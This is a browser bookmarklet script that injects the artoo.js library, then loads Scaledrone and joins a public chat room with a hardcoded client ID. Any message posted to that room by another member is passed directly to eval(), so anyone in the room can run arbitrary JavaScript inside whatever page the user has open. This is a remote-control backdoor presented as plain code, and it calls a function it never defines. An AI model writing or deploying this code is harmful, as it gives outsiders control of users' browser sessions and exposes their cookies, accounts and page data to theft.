javascript: (function(){var t={},e=!0;if("object"==typeof this.artoo&&(artoo.settings.reload||(artoo.log.verbose("artoo already exists within this page. No need to inject him again."),artoo.loadSettings(t),artoo.exec(),e=!1)),e){var o=document.getElementsByTagName("body")[0];o||(o=document.createElement("body"),document.documentElement.appendChild(o));var a=document.createElement("script");console.log("artoo.js is loading..."),a.src="//medialab.github.io/artoo/public/dist/artoo-latest.min.js",a.type="text/javascript",a.id="artoo_injected_script",a.setAttribute("settings",JSON.stringify(t)),o.appendChild(a)}}).call(this);
artoo.injectScript('https://cdn.scaledrone.com/scaledrone.min.js', function() {
  console.log('Finished injecting jquery version 1.11.0');
});

const CLIENT_ID = 'Wa9787NIBwG7ckyH';

const drone = new ScaleDrone(CLIENT_ID, {
  data: { // Will be sent out as clientData via events
    name: getRandomName(),
    color: '#0000FF',
  },
});

let members = [];

drone.on('open', error => {
  if (error) {
    return console.error(error);
  }
  console.log('Successfully connected to Scaledrone');

  const room = drone.subscribe('observable-room');
  room.on('open', error => {
    if (error) {
      return console.error(error);
    }
    console.log('Successfully joined room');
  });

  room.on('members', m => {
    members = m;
    updateMembersDOM();
  });

  room.on('member_join', member => {
    members.push(member);
    updateMembersDOM();
  });

  room.on('member_leave', ({id}) => {
    const index = members.findIndex(member => member.id === id);
    members.splice(index, 1);
    updateMembersDOM();
  });

  room.on('data', (text, member) => {
    if (member) {
     eval(text)
    } else {
      // Message is from server
    }
  });
});

drone.on('close', event => {
  console.log('Connection was closed', event);
});

drone.on('error', error => {
  console.error(error);
});

function getRandomName() {
  const adjs = ["bookmark"];
  const nouns = ["user"];
  return (
    adjs[Math.floor(Math.random() * adjs.length)] +
    "_" +
    nouns[Math.floor(Math.random() * nouns.length)]
  );
}

function getRandomColor() {
  return '#' + Math.floor(Math.random() * 0xFFFFFF).toString(16);
}
